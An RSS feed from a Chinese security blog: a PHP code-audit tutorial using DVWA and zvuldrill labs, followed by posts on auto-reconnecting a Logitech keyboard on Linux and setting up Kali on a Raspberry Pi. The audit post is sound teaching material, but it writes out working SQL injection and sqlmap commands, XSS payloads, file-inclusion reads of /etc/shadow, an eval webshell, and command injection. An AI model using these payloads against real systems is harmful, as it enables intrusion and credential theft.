<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Jaie</title>
    <link>https://www.jaie.cc/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Sun, 19 Jul 2020 00:32:07 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>代码审计基础</title>
      <link>https://www.jaie.cc/2020/07/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</link>
      <guid>https://www.jaie.cc/2020/07/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</guid>
      <pubDate>Sun, 19 Jul 2020 00:22:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt; 代码审计对编程语言的基础需要有一定的基础，基于PHP编程语言进行常见漏洞审计总结，利用靶场、CMS漏洞等相关例题实例对漏洞类型进行解述，并根据OWASP 2017 TOP10和阿里云2019上半年Web应用安全报告结合进行漏洞分类（如下两图）&lt;br&gt;OWASP开放式Web
        
      
      </description>
      
      <content:encoded><![CDATA[<p> 代码审计对编程语言的基础需要有一定的基础，基于PHP编程语言进行常见漏洞审计总结，利用靶场、CMS漏洞等相关例题实例对漏洞类型进行解述，并根据OWASP 2017 TOP10和阿里云2019上半年Web应用安全报告结合进行漏洞分类（如下两图）<br>OWASP开放式Web应用程序安全项目是一个组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。从OWASP和阿里云的报告可以看出在互联网中常见的WEB攻击，SQL注入、信息泄漏、XXE漏洞、文件包含、XSS跨站攻击等，可以从这些常见的漏洞入手进行审计。</p><p><img src="/2020/07/19/代码审计基础/6cb4e3162ff3fe083e398f27902e5565.png" alt></p><p><img src="/2020/07/19/代码审计基础/f4d0698c5d88cf30d708f7e88669ce4e.png" alt></p><h1 id="一-代码审计"><a href="#一-代码审计" class="headerlink" title="一.代码审计"></a>一.代码审计</h1><h2 id="1-审计工具选择"><a href="#1-审计工具选择" class="headerlink" title="1.审计工具选择"></a>1.审计工具选择</h2><ol><li>Seay源代码审计系统</li></ol><p>Seay是基于C#语言开发的一款针对PHP代码安全性审计的系统，主要运行与Windows系统上。这款软件能够发现SQL注入、代码执行、命令执行、文件包含、文件上传、绕过转义防护、拒绝服务、XSS跨站、信息泄漏、任意URL跳转等漏洞，基本覆盖常见的PHP漏洞。</p><ol start="2"><li>RIPS</li></ol><p>PIPS是一款基于PHP开发的针对PHP代码审计的软件。同时它也是一款开源软件，由国外安全研究员Johannes<br>Dahse开发，程序大小只有450KB。RIPS通过标记和解析所有源代码文件，自动检测PHP应用程序中的漏洞。RIPS能够将PHP源代码转换为程序模型，检测程序流期间用户输入可能污染的敏感接收器，即潜在易受攻击的函数。RIPS能够发现SQL注入、XSS跨站、文件包含、代码执行、文件读取等等多种漏洞，支持多种样式的代码高亮，支持自动生成漏洞利用。</p><ol start="3"><li>Sublime Text</li></ol><p>Sublime Text<br>是一个跨平台的编辑器，同时也是一个先进的代码编辑器。支持windows、linux和Mac系统，其在不同操作系统下有不同的操作的习惯，包括界面布局，快捷键等。Sublime Text是由程序员Jon Skinner于2008年1月份所开发出来，它最初被设计为一个具有丰富扩展功能的Vim。</p><p>Sublime<br>Text具有漂亮的用户界面和强大的功能，例如代码<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=4069827&amp;ss_c=ssc.citiao.link" target="_blank" rel="noopener">缩略图</a>，Python的插件，代码段等。还可自定义键绑定，菜单和工具栏。Sublime Text 的主要功能包括：拼写检查，书签，完整的 Python API ， Goto功能，即时项目切换，多选择，多窗口等等。</p><ol start="3"><li>Burp Suite</li></ol><p>Burp Suite是一款基于Java语言开发的安全测试工具，使用它需要安装Java有运行环境。Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。其强大的功能受到几乎所有安全人员的青睐。Burp Suite主要分为Proxy、Spider、Scanner、Intruder、Repeater、Decoder和Comparer几大模块。</p><ol start="4"><li>Acunenetix Web Vulnarability Scanner</li></ol><p>Acunetix Web Vulnerability<br>Scanner（简称AWVS）是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞,它包含有收费和免费两种版本。它包含有收费和免费两种版本。</p><h2 id="2-审计思路"><a href="#2-审计思路" class="headerlink" title="2.审计思路"></a>2.审计思路</h2><p>代码审计需要方法，如果直接拿起源代码看的话，将会寸步难行，很难能有明显的效果，特别是一个应用项目源代码上千上万行。所有代码审计就必须要熟悉代码审计的思路，只有了解这些思路之后，我们才知道如何下手，如何最高效地挖掘到最有质量的漏洞，常见的代码审计有通读全文法、敏感函数参数回溯法、定向功能分析法。</p><ol><li>通读全文法</li></ol><p>顾名思义，就是通过阅读所有的源代码，来发现代码存在的隐患。这种方法只适用代码量较少的项目，当项目代码极大时，很难兼顾所有的代码，而且代码都是很强的逻辑性的。利用这种思路阅读代码代码时，也不是一味的读代码，需要一定的技巧，需要理解代码的业务逻辑，项目程序的代码结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，除此之外、也需要知道文件大小、创建时间、核心文件文件命名含义及实现的功能、需要对项目整体有着把握。如duenling1.0<br>程序主目录</p><p><img src="/2020/07/19/代码审计基础/f5263f907940319bc75f3b1187cc7080.png" alt></p><p>从目录和文件命名中，可以了解到程序大概框架，各个目录命名和文件内容，install目录时程序初始安装文件、editor目录下是编辑器文件、js目录是js文件、plug-in目录下是插件文件、style目录下是样式文件、images是放置图片的目录、index.php是页面初始页面。</p><ol><li>敏感函数参数回溯法</li></ol><p>大多数漏洞很大程度都是由函数使用不规范，或函数本身存在安全问题，这些导致漏洞产生的函数就是敏感函数。通过搜索这些敏感函数定向分析函数使用问题，是否存在漏洞。像SQL注入，有一些特征，比如select、insert等，再结合from和where等关键字分析判断是否存在SQL注入。</p><p>可以借助审计工具自动搜索敏感函数，来进行审计，这里用Seay源代码审计系统审计duenling1.0为例，Seay源代码审计系统审计得结果是根据敏感函数判断得，审计结果如下图。需要主要注意是这种自动审计工具大多时候是误报，且没有给出漏洞得利用方式，所以最终还是以人工审计为主，工具为辅。</p><p><img src="/2020/07/19/代码审计基础/9265070d62fb722b7ca2d5bef469ae2f.png" alt></p><ol><li>定向功能分析法</li></ol><p>该方法主要是根据程序的业务逻辑和业务功能进行审计的，首先大概浏览网站的页面，比如有上传功能，有浏览功能，可能猜测到这个程序有上传漏洞、XSS漏洞等，可以大概的推测它有哪些漏洞，然后再针对猜测的结果，进行定向分析。<br>常见的功能漏洞：程序初始安装漏洞、站点信息泄露、文件上传管理、登录认证、权限管理漏洞、数据库备份漏洞、验证码漏洞等。</p><h2 id="二-漏洞审计"><a href="#二-漏洞审计" class="headerlink" title="二.漏洞审计"></a>二.漏洞审计</h2><h4 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.  SQL注入"></a>1.  SQL注入</h4><p>SQL注入（SQLi）是一种注入攻击，它使执行恶意SQL语句成为可能。这些语句控制Web应用程序后面的数据库服务器。攻击者可以使用SQL Injection漏洞绕过应用程序安全措施。他们可以遍历网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容。他们还可以使用SQL Injection添加，修改和删除数据库中的记录。SQL注入是最常见的Web黑客技术之一。OWASP组织（开放式Web应用程序安全性项目）在其<a href="https://www.acunetix.com/vulnerability-scanner/owasp-top-10-compliance/" target="_blank" rel="noopener">OWASP Top<br>10</a> 2017文档中列出了注入，这是对Web应用程序安全性的头号威胁。</p><p>在进行代码审计是找寻SQL注入漏洞的类型，可以尝试找寻数据库操作的一些关键字，比如mysql_connect、mysql_quer、mysql_fetech_row等，数据查询的关键词又update、insert、delect，在审计过程中找到这些关键字，即可定向挖掘SQL注入的漏洞。</p><ol><li>普通注入</li></ol><p>普通注入是SQL注入漏洞中最容易利用得类型，普通注入有int型和string型，string型注入时需要闭合单双引号，重新组合成新的SQL语句。下面利用DWVA漏洞靶场演示普通注入漏洞，测试代码如下：</p><p>“\$query = “SELECT first_name, last_name FROM users WHERE user_id =’\$id’;”;”是此次漏洞利用得切入点，通过闭合参数\$id的单引号，重新构造SQL语句，“1’or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #” group_concat函数合并选择参数输出成1个字段，#是mysql的注释符，用来注释后面的双引号，所以SQL执行的语句是“\$query  = “SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #   ‘;”;”从下图可以看出语句读取成功，读出了数据库的账号密码，造成非常大的危害，攻击者只需要拿到账号密码登录数据库或构造可以拖库SQL语句，便可拖下整个数据库的数据，在现实中便会造成非常大的危害。</p><p><img src="/2020/07/19/代码审计基础/12e814e22363e02151fd12a4c5ca41b0.png" alt></p><ol><li>SQL盲注</li></ol><p>SQL盲注是根据回显结果的SQL的注入，不同普通的SQL注入直接执行一句SQL语句得到想要的的结果，SQL盲注需要构造复杂的SQL语句，并且是多条的。根据页面的响应方式的不同，SQL盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注。</p><p>布尔盲注的回显是基于SQL执行语句真or假来判断；时间盲注是根据时间函数服务器返回的时间判断的；报错注入是根据回显结果SQL的报错内容判断的。</p><p>下面用DWVS SQL盲注演示下，测试代码如下：</p><p>从源代码看到这是布尔盲注，根据“ \$num = \@mysqli_num_rows( \$result);“从“\$getid = “SELECT first_name, last_name FROM users WHERE user_id =’\$id’;”;” 获取的结果行数判断id存在与否，返回结构为exists和MISSING。</p><p><img src="/2020/07/19/代码审计基础/7df495f07fb3e8877f6762c32baba59a.png" alt></p><p>在文本框执行语句“1’ and length(database())>5 #”返回MISSING、“1’ and<br>length(database())>4 #” 返回exists，“1’ and length(database())=4 #”返回exists，得出当前所连接数据库名称的长度=4，再然后就是利用substr()函数判断数据库名称的字符组成元素，文本框“1’<br>and ascii(substr(database(),1,1))=100 #” 这里100对应的ASCII码查询是字母 <strong>d，</strong>下来我们用sqlmap工具自动化直接跑出数据库，执行语句“sqlmap.py<br>-u “<a href="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit\#&quot;" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit\#&quot;</a> –dbms mysql –  cookie=”security=low;PHPSESSID=m83iepdter52q5ugifpgvdogl4;” –dbs –level 3“</p><p>如下图所示，跑出来了。</p><p><img src="/2020/07/19/代码审计基础/cebce3aee6402763c141606e18751b90.png" alt></p><h4 id="2-XSS漏洞"><a href="#2-XSS漏洞" class="headerlink" title="2.  XSS漏洞"></a>2.  XSS漏洞</h4><p>跨站点脚本（XSS）是一种客户端代码注入攻击。攻击者旨在通过在合法网页或Web应用程序中包含恶意代码，在受害者的Web浏览器中执行恶意脚本。当受害者访问执行恶意代码的网页或Web应用程序时，就会发生实际的攻击。网页或Web应用程序成为将恶意脚本传递到用户浏览器的工具。经常用于跨站点脚本攻击的脆弱工具是论坛，留言板和允许评论的网页。如果网页或Web应用程序在生成的输出中使用未经过滤的用户输入，则容易受到XSS的攻击。然后必须由受害者的浏览器解析此用户输入。</p><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数，我们只要寻找带有变量的这些函数即可。常用的输出函数列表如下：print、print_r、echo、printf、sprintf、die、var_dump、var_export，XSS漏洞经常出现在文章发表、评论回复、留言以及资料设置等地方，特别是在发文章的时候，因为这里大多都是富文本，有各种图片引用、文字格式设置等，所以经常出现对标签事件过滤不严格导致的XSS，同样，评论回复以及留言也是。XSS漏洞分为反射型XSS、储存型XSS、DOM型XSS。DOM型XSS比较不常见，这里我们反射型XSS、储存型XSS、DOM型XSS讲解。</p><ol><li>反射型XSS</li></ol><p>反射型XSS是把javascipt代码在前端执行，仅在浏览器客户端这边执行，不会威胁到服务端.这里用zvuldrill<br>Web漏洞演练平台项目代码进行演示，这是项目主目录下search.php的部分代码，可以看到用echo函数直接输出search参数，存在XSS漏洞，在网页页面找到这个功能点进行测试。用“\&lt;script>alert\&lt;/script>”语句进行测试，弹出弹框，测试成功。</p><p><img src="/2020/07/19/代码审计基础/b55d83cb456ba44b4c8f15abc39e7b6b.png" alt></p><p>、</p><p><img src="/2020/07/19/代码审计基础/d1bb146cd9c2e649cc6d245234c48ea8.png" alt></p><p><img src="/2020/07/19/代码审计基础/f25752f5a4fed0c494ab0e4170f7fe61.png" alt></p><ol><li>储存型XSS</li></ol><p>储型型XSS会对服务端造成危害，攻击者把js代码存进数据库，每次读取相应的数据内容都会反弹XSS，危害比反射型XSS大。可以看到虽然源代码进行了一定的过滤，trim（）函数移除字符串两侧的空白字符或其他预定义字符。mysql_real_escape_string（）函数会对特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。Stripslashes（）函数删除字符串中的反斜杠。很容易绕过，在message留言板中输入“\&lt;script>alert(/xss/)\&lt;/script>”，这条语句会写入数据库，每次刷新都会重新执行。</p><p><img src="/2020/07/19/代码审计基础/d67849142425eb0e8f9cfa9ce2f2c997.png" alt></p><h4 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.  文件包含"></a>3.  文件包含</h4><p>文件包含是指程序代码在处理包含文件的时候没有严格控制。导致用户可以构造参数包含远程代码在服务器上执行，并得到网站配置或者敏感文件，进而获取到服务器权限，造成网站被恶意删除，用户和交易数据被篡改等一系列恶性后果。主要包括本地文件包含和远程文件包含两种形式，由于开发人员编写源码，开放着将可重复使用的代码插入到单个的文件中，并在需要的时候将它们包含在特殊的功能代码文件中，然后包含文件中的代码会被解释执行。由于并没有针对代码中存在文件包含的函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端解释执行。文件包含攻击中WEB服务器源码里可能存在inlcude()此类文件包含操作函数，可以通过客户端构造提交文件路径，是该漏洞攻击成功的最主要原因。</p><p>  和文件包含的相关函数有：include()、include_once()和require()、require_once()，我们可以从这些函数入手方便我们进行审计。</p><ol><li>本地文件包含</li></ol><p>本地文件包含（Local File Inclusion，LFI）是指只能打开并包含本地文件的漏洞，攻击者可以使用本地文件包含（LFI）来欺骗Web应用程序以在Web服务器上公开或运行件。LFI攻击可能导致信息泄露。</p><p>这里用zvuldrill Web漏洞演练平台项目代码进行演示，主目录下的about.php文件部分代码，代码如下：</p><p>include函数包含了\$f参数，\$f参数是用GET方式提交的，也就是说在URL里就可以进行想要的文件进行包含，如下面所示，包含D盘的1.txt成功显示，实际的利用中我们可以尝试包含其他文件，造成危害更大的泄漏，像linux系统的话可以包含/etc/passwd、/etc/shadow等文件。</p><p><img src="/2020/07/19/代码审计基础/36e097390ec9cf5de80806846dcd76be.png" alt></p><p><img src="/2020/07/19/代码审计基础/d3d003224daba22eb815a4cc28b2dc0d.png" alt></p><ol><li>远程文件包含</li></ol><p>远程文件包含（Remote File Inclusion，RFI）,使用远程文件包含（RFI），攻击者可以使Web应用程序包含远程文件。对于动态包含外部文件或脚本的Web应用程序，这是可能的。成功的RFI攻击对Web造成的潜在后果包括敏感信息泄露和跨站点脚本（XSS）到远程代码执行，以及最终导致整个系统受到损害。RFI的利用条件较为苛刻，需要php.ini中进行配置。</p><p>在php.ini中allow_url_fopen = On、allow_url_include =On，两个配置选项均需要为On，才能远程包含文件成功。测试代码如下：</p><p>文件命名1.php，利用GET方式提交file参数即在URL参数里面传入http：//remotehost/1.txt”,其中1.txt的内容为\&lt;?php phpinfo();>.访问后返回本机的phpinfo信息</p><p><img src="/2020/07/19/代码审计基础/7a949a08d6dbb4bd55c5bc5455379c98.png" alt></p><h4 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4 .  文件上传"></a>4 .  文件上传</h4><p>文件上传漏洞，是指程序有文件上传功能，能上传代码执行的文件类型，进而通过让服务器的代码执行文件控制整个计算机的权限。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>文件上传的函数只有move_uploaded_file()这一个，所以在进行代码审计是搜索move_uploaded_file()快速定位可以上传的代码块，进行审计，这样会方便高效很多。这里用DWAV文件上传区块进行演示，测试代码如下：</p><p>可以看到上述代码用move_uploaded_file()进行文件上传且没有限制任何文件类型上传，并且在网页显示出hackable/uploads/目录，再结合URL便可以找到上传文件今天位置。首先创建一个test.php文件，内容为“\&lt;?php<br>\@eval(\$_POST[‘x’]);?>”，再进行上传，猜解上传文件上传指定的具体文件，转换为URL放进webshell连接工具中国菜刀，进行连接，连接成功，可以获取系统的终端和进行文件操作。</p><p><img src="/2020/07/19/代码审计基础/6f4fff94d29b2521be8d4a202ca8ffac.png" alt></p><p><img src="/2020/07/19/代码审计基础/a82bce4c6441fb013ff8defac842a73a.png" alt></p><p><img src="/2020/07/19/代码审计基础/c2e602e694c67ce55c553f22f2bbc634.png" alt></p><h4 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5.  命令执行"></a>5.  命令执行</h4><p>命令执行即是在页面中可以执行操作系统终端的命令，像ipconfig、kill、rd、net<br>user等命令，等同把自己的计算机权限暴露在网络中，是非常的危险的漏洞。</p><p>在PHP中可以执行命令函数有system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()，一共七个函数，另外反引号（`）也可以执行命令但是反引号是调用shell_exec（）函数。只要找到这些函数就可以定向审计命令执行的漏洞。</p><p>从源代码看到使用了shell_exec 这个函数，\$target<br>request方式进来的数据没有进行截断和过滤，当输入“127.0.0.1 | dir<br>”相当执行了“ping 127.0.0.1 | dir”命令，这样我们可以执行我们想要执行任意命令。</p><p><img src="/2020/07/19/代码审计基础/d7cdba1412d551c0bd6b58dce400e46d.png" alt></p><h4 id="6-其他的一些漏洞"><a href="#6-其他的一些漏洞" class="headerlink" title="6.  其他的一些漏洞"></a>6.  其他的一些漏洞</h4><ol><li>信息泄漏</li></ol><p>信息泄漏漏洞主要是程序员在编辑程序时，没有将一些默认的文件和敏感的文件等删掉，比如数据库备份文件、配置文件等，.git目录，。SVN目录等攻击者利用该信息可以更容易得到网站权限，导致网站被黑。一些信息泄漏常见的命名：.hg、.zip、.bak、.txt、config等，这些信息泄漏危害可大可小，当泄漏的时网站源代码的话，黑客可以利用源代码进行审计方便黑客攻击网站。当泄漏的是数据库文件，造成就非常严重了。</p><ol start="2"><li>重装漏洞</li></ol><p>在一些CMS网站程序中，网站在最开始会初始化安装，但因为程序设计缺陷会导致无限重装，对网站造成危害。举个例子，程序在安装完成后会将install.php<br>重命名为index.php.bak,但是由于Apache的解析漏洞：如果无法识别到最后一个后缀的话，就会向上解析，那么就又变成了php了，然后URL访问index.php.bak又成重装了。</p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/#disqus_thread</comments>
    </item>
    
    <item>
      <title>linux连接罗技k380蓝牙键盘问题解决方案</title>
      <link>https://www.jaie.cc/2020/07/19/linux%E8%BF%9E%E6%8E%A5%E7%BD%97%E6%8A%80K380%E8%93%9D%E7%89%99%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</link>
      <guid>https://www.jaie.cc/2020/07/19/linux%E8%BF%9E%E6%8E%A5%E7%BD%97%E6%8A%80K380%E8%93%9D%E7%89%99%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</guid>
      <pubDate>Sat, 18 Jul 2020 16:50:54 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在我的linux连接罗技k380后，成功连接，如图我用f1键用来连接我的windows 10，f2键连接linux。但是每次切换windows时，在切回linux时便要重新配对，太烦了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/07/19/linux连接罗技K380蓝
        
      
      </description>
      
      <content:encoded><![CDATA[<p>在我的linux连接罗技k380后，成功连接，如图我用f1键用来连接我的windows 10，f2键连接linux。但是每次切换windows时，在切回linux时便要重新配对，太烦了。</p><p><img src="/2020/07/19/linux连接罗技K380蓝牙问题解决方案/20200719180341-1595153120533.jpg" alt="20200719180341"></p><p>然后想到让系统计划任务自动连接蓝牙，而不是每次手动连接蓝牙   </p><p><code>apt-get -y install bluetooth bluez bluez-tools rfkill</code>安装BlueZ从Linux终端连接到蓝牙设备   </p><p><code>bluetoothctl connect 34:88:5D:EE:26:BD</code> 测试连接蓝牙，这里是蓝牙的mac地址，连接成功</p><p><img src="/2020/07/19/linux连接罗技K380蓝牙问题解决方案/image-20200719182840794.png" alt="image-20200719182840794"></p><p>新建个shell脚本命名为sec.sh让蓝牙1分钟内每两秒连接一次蓝牙,代码如下：</p><pre><code class="shell">step=2for ((i = 0; i &lt; 60; i=(i+step))); do        $(/bin/bluetoothctl connect 34:88:5D:EE:26:BD)        sleep $stepdone exit 0</code></pre><p>在建个计划任务每分钟执行这个脚本 <code>crontab -e</code></p><p><img src="/2020/07/19/linux连接罗技K380蓝牙问题解决方案/image-20200719182008055.png" alt="image-20200719182008055"></p><p><code>service crond restart</code>重启计划任务</p><p>长按f2键 ，接下来系统就自动连接键盘，连接成功，按住f1切回windows，长按f2连回linux，中间无需进行蓝牙配置步骤。</p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/19/linux%E8%BF%9E%E6%8E%A5%E7%BD%97%E6%8A%80K380%E8%93%9D%E7%89%99%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/#disqus_thread</comments>
    </item>
    
    <item>
      <title>树莓派kali2020环境搭建</title>
      <link>https://www.jaie.cc/2020/07/19/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <guid>https://www.jaie.cc/2020/07/19/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <pubDate>Sat, 18 Jul 2020 16:49:07 GMT</pubDate>
      <description>
      
        
        
          &lt;h4 id=&quot;1-下载镜像安装&quot;&gt;&lt;a href=&quot;#1-下载镜像安装&quot; class=&quot;headerlink&quot; title=&quot;1.下载镜像安装&quot;&gt;&lt;/a&gt;1.下载镜像安装&lt;/h4&gt;&lt;p&gt;到&lt;a href=&quot;https://note.youdao.com/&quot; target=&quot;_b
        
      
      </description>
      
      <content:encoded><![CDATA[<h4 id="1-下载镜像安装"><a href="#1-下载镜像安装" class="headerlink" title="1.下载镜像安装"></a>1.下载镜像安装</h4><p>到<a href="https://note.youdao.com/" target="_blank" rel="noopener">https://www.offensive-security.com/kali-linux-arm-images/</a>下载镜像。</p><h4 id="2-安装谷歌浏览器"><a href="#2-安装谷歌浏览器" class="headerlink" title="2.安装谷歌浏览器"></a>2.安装谷歌浏览器</h4><p>  安装谷歌浏览器<br><code>apt-get install chromium</code>   <br><strong>允许root登录</strong><br><code>vim /bin/chromium</code>修改文件，在指定地方添加–no-sandbox<br><img src="/2020/07/19/树莓派环境搭建/image-20200719005013640.png" alt="image-20200719005013640"></p><h4 id="4-安装docker"><a href="#4-安装docker" class="headerlink" title="4.安装docker"></a>4.安装docker</h4><p><code>apt install docker.io</code><br><code>systemctl start docker</code> 启动docker<br><code>systemctl enable docker</code> 开机自启动<br> <code>vi /etc/docker/daemon.json</code> 修改docker镜像为国内的   </p><pre><code> {    &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]}</code></pre><p>systemctl restart docker 重启docker</p><h4 id="5-安装aria2"><a href="#5-安装aria2" class="headerlink" title="5.安装aria2"></a>5.安装aria2</h4><p><code>apt install -y aria2</code>安装aria2程序<br><code>mkdir -p ~/.config/aria2/</code> 创建文件夹<br><code>vim ~/.config/aria2/aria2.config</code>编辑配置文件  </p><pre><code>daemon=truerpc-secret=kali2020      #密钥enable-rpc=truerpc-allow-origin-all=truerpc-listen-all=truemax-concurrent-downloads=15continue=truemax-connection-per-server=10min-split-size=10Msplit=10continue=truemax-overall-download-limit=0max-download-limit=0max-overall-upload-limit=0max-upload-limit=0dir=/media/kali/TOSHIBA EXT/Downloadsfile-allocation=prealloccheck-certificate=falsesave-session=/root/.config/aria2/aria2.sessioninput-file=/root/.config/aria2/aria2.sessionsave-session-interval=60bt-seed-unverified=truebt-max-peers=55enable-dht=truebt-enable-lpd=trueenable-peer-exchange=truebt-tracker=udp://tracker.coppersurfer.tk:6969/announce,udp://tracker.opentrackr.org:1337/announce,http://tracker.opentrackr.org:1337/announce,udp://tracker.leechers-paradise.org:6969/announce,http://p4p.arenabg.com:1337/announce,udp://p4p.arenabg.com:1337/announce,udp://9.rarbg.to:2710/announce,udp://9.rarbg.me:2710/announce,udp://exodus.desync.com:6969/announce,udp://tracker.cyberia.is:6969/announce,udp://tracker3.itzmx.com:6961/announce,udp://retracker.lanta-net.ru:2710/announce,udp://open.stealth.si:80/announce,http://tracker3.itzmx.com:6961/announce,http://tracker1.itzmx.com:8080/announce,udp://tracker.tiny-vps.com:6969/announce,udp://tracker.torrent.eu.org:451/announce,udp://tracker.moeking.me:6969/announce,udp://ipv4.tracker.harry.lu:80/announce,udp://bt2.archive.org:6969/announce,udp://bt1.archive.org:6969/announce,http://tracker.nyap2p.com:8080/announce,udp://valakas.rollo.dnsabr.com:2710/announce,udp://tracker.zerobytes.xyz:1337/announce,udp://tracker.uw0.xyz:6969/announce,udp://tracker.lelux.fi:6969/announce,udp://retracker.akado-ural.ru:80/announce,udp://opentracker.i2p.rocks:6969/announce,udp://opentor.org:2710/announce,https://tracker.lelux.fi:443/announce,http://tracker.zerobytes.xyz:1337/announce,http://tracker.lelux.fi:80/announce,http://opentracker.i2p.rocks:6969/announce,http://h4.trakx.nibba.trade:80/announce,udp://tracker.ds.is:6969/announce,udp://explodie.org:6969/announce,http://vps02.net.orel.ru:80/announce,http://open.acgtracker.com:1096/announce,http://explodie.org:6969/announce,udp://zephir.monocul.us:6969/announce,udp://www.loushao.net:8080/announce,udp://u.wwwww.wtf:1/announce,udp://tracker.yoshi210.com:6969/announce,udp://tracker.teambelgium.net:6969/announce,udp://tracker.skyts.net:6969/announce,udp://tracker.jae.moe:6969/announce,udp://tracker.dler.org:6969/announce,udp://tracker.army:6969/announce,udp://tr2.ysagin.top:2710/announce,udp://t3.leech.ie:1337/announce,udp://t2.leech.ie:1337/announce,udp://t1.leech.ie:1337/announce,udp://retracker.sevstar.net:2710/announce,udp://retracker.netbynet.ru:2710/announce,udp://qg.lorzl.gq:2710/announce,udp://chihaya.de:6969/announce,udp://aaa.army:8866/announce,https://w.wwwww.wtf:443/announce,https://tracker.vectahosting.eu:2053/announce,https://tracker.sloppyta.co:443/announce,https://tracker.nitrix.me:443/announce,https://tracker.nanoha.org:443/announce,https://tracker.jae.moe:443/announce,https://tracker.hama3.net:443/announce,https://aaa.army:8866/announce,https://1337.abcvg.info:443/announce,http://trun.tom.ru:80/announce,http://tracker2.dler.org:80/announce,http://tracker.yoshi210.com:6969/announce,http://tracker.ygsub.com:6969/announce,http://tracker.sloppyta.co:80/announce,http://tracker.skyts.net:6969/announce,http://tracker.dler.org:6969/announce,http://tracker.bt4g.com:2095/announce,http://t3.leech.ie:80/announce,http://t1.leech.ie:80/announce,http://t.overflow.biz:6969/announce,http://t.nyaatracker.com:80/announce,http://retracker.sevstar.net:2710/announce,http://pow7.com:80/announce,http://open.acgnxtracker.com:80/announce,http://mail2.zelenaya.net:80/announce,http://aaa.army:8866/announce,udp://tracker6.dler.org:2710/announce,udp://tracker4.itzmx.com:2710/announce,udp://tracker2.itzmx.com:6961/announce,udp://tracker.filemail.com:6969/announce,udp://tr.bangumi.moe:6969/announce,udp://cx42light.cn:39652/announce,udp://bt2.54new.com:8080/announce,https://tracker.tamersunion.org:443/announce,https://tracker.shittyurl.org:443/announce,https://tracker.imgoingto.icu:443/announce,https://tracker.coalition.space:443/announce,https://tr.ready4.icu:443/announce,http://tracker4.itzmx.com:2710/announce,http://tracker2.itzmx.com:6961/announce,http://tracker.shittyurl.org:80/announce,http://t2.leech.ie:80/announce,http://t.acg.rip:6699/announce</code></pre><p><code>aria2c --conf-path=/root/.config/aria2/aria2.config</code><br><code>ps aux|grep aria2</code> 查看进程是否启动<br><a href="https://github.com/mayswind/AriaNg下载web程序文件" target="_blank" rel="noopener">https://github.com/mayswind/AriaNg下载web程序文件</a><br>放在apache web目录   </p><h5 id="下载慢解决方案"><a href="#下载慢解决方案" class="headerlink" title="下载慢解决方案"></a>下载慢解决方案</h5><p><a href="http://edam.top/tk/" target="_blank" rel="noopener">http://edam.top/tk/</a> 将 trackers_best (推荐) 获取生成的trackers列表<br>修改配置文件<code>vim aria2.config</code>bt-tracker=</p><pre><code>bt-tracker=udp://tracker.coppersurfer.tk:6969/announce,udp://tracker.opentrackr.org:1337/announce,udp://tracker.internetwarriors.net:1337/announce,udp://p4p.arenabg.com:1337/announce,udp://9.rarbg.to:2710/announce,udp://9.rarbg.me:2710/announce,udp://exodus.desync.com:6969/announce,udp://tracker.cyberia.is:6969/announce,udp://tracker.tiny-vps.com:6969/announce,udp://open.stealth.si:80/announce,udp://tracker.torrent.eu.org:451/announce,udp://tracker3.itzmx.com:6961/announce,udp://tracker.moeking.me:6969/announce,udp://retracker.lanta-net.ru:2710/announce,http://tracker1.itzmx.com:8080/announce,udp://bt2.archive.org:6969/announce,udp://bt1.archive.org:6969/announce,udp://tracker4.itzmx.com:2710/announce,udp://ipv4.tracker.harry.lu:80/announce,http://tracker.nyap2p.com:8080/announce</code></pre><h5 